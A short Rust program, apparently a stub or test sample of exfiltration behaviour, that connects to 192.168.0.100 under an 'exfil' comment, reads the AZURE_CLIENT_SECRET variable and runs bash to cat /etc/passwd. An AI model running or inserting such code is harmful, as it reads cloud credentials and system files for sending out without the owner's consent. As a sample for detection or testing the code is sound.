use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    let _v = env::var("AZURE_CLIENT_SECRET").unwrap_or_default();
    Command::new("bash").arg("-c").arg("cat /etc/passwd").spawn().ok();
}
